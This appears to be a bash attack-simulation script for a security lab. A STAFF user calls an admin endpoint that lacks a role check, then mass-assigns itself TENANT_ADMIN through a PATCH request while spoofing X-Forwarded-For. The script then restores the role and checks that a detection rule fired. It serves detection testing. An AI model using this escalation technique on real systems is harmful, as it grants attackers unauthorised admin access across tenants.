#!/bin/bash
# 05-privilege-escalation: a STAFF user in tenant-alpha mass-assigns their own
# role to TENANT_ADMIN (VULN-011) and then exercises the broken-RBAC admin
# endpoint (VULN-003). The role is restored before the script exits.
# Should trip RULE-005 (Privilege Escalation Detection).
set -e

DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
. "$DIR/../lib.sh"

title "Attack Sim: Privilege Escalation (05)"

XFF="$(random_xff)"
log "Using source IP $XFF for this run"

echo ""
log "[1/6] Login as admin to look up a STAFF user in tenant-alpha..."
ADMIN_TOKEN=$(login "admin@sentinelforge.lab" "admin_demo_123" "$XFF")
[ -n "$ADMIN_TOKEN" ] || { err "Admin login failed"; exit 1; }

USERS_JSON=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" -H "X-Forwarded-For: $XFF" "$API/api/admin/users")
STAFF_ID=$(node -e '
  let d = "";
  process.stdin.on("data", c => d += c);
  process.stdin.on("end", () => {
    try {
      const users = JSON.parse(d);
      const staff = users.find(u => u.role === "STAFF" && u.tenantId === "tenant-alpha");
      process.stdout.write(staff ? staff.id : "");
    } catch (e) { process.stdout.write(""); }
  });
' <<< "$USERS_JSON")
STAFF_EMAIL=$(node -e '
  let d = "";
  process.stdin.on("data", c => d += c);
  process.stdin.on("end", () => {
    try {
      const users = JSON.parse(d);
      const staff = users.find(u => u.role === "STAFF" && u.tenantId === "tenant-alpha");
      process.stdout.write(staff ? staff.email : "");
    } catch (e) { process.stdout.write(""); }
  });
' <<< "$USERS_JSON")

[ -n "$STAFF_ID" ] || { err "No STAFF user found in tenant-alpha - run scripts/seed.sh first"; exit 1; }
ok "Found STAFF user: $STAFF_ID <$STAFF_EMAIL>"

echo ""
log "[2/6] Login as the STAFF user..."
TOKEN=$(login "$STAFF_EMAIL" "demo_password_123" "$XFF")
[ -n "$TOKEN" ] || { err "STAFF login failed"; exit 1; }
ok "Logged in as $STAFF_EMAIL"

echo ""
log "[3/6] STAFF calls the broken-RBAC admin endpoint (VULN-003)..."
CODE=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H "X-Forwarded-For: $XFF" "$API/api/admin/users/vulnerable")
ok "GET /api/admin/users/vulnerable -> HTTP $CODE (no role check)"

echo ""
log "[4/6] STAFF mass-assigns their own role to TENANT_ADMIN (VULN-011)..."
PATCH=$(curl -s -X PATCH -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "X-Forwarded-For: $XFF" \
  -d '{"role":"TENANT_ADMIN","isAdmin":true}' \
  "$API/api/users/$STAFF_ID")
ok "PATCH /api/users/$STAFF_ID {role:TENANT_ADMIN} -> role is now $(json_get "$PATCH" "role")"

echo ""
log "[5/6] Re-login to pick up the escalated role, then call the secure admin API..."
TOKEN2=$(login "$STAFF_EMAIL" "demo_password_123" "$XFF")
CODE2=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOKEN2" -H "X-Forwarded-For: $XFF" "$API/api/admin/users")
if [ "$CODE2" = "200" ]; then
  ok "GET /api/admin/users (secure) -> HTTP 200 - escalation CONFIRMED, former STAFF user now has admin access"
else
  warn "GET /api/admin/users (secure) -> HTTP $CODE2"
fi

echo ""
log "[6/6] Lab cleanup: restoring original STAFF role..."
curl -s -o /dev/null -X PATCH -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" -H "X-Forwarded-For: $XFF" \
  -d '{"role":"STAFF","isAdmin":false}' \
  "$API/api/users/$STAFF_ID"
ok "Role restored to STAFF for $STAFF_ID"

echo ""
run_detection "$XFF"
print_newest_incidents 5

echo ""
title "Privilege escalation simulation complete (source IP $XFF)"
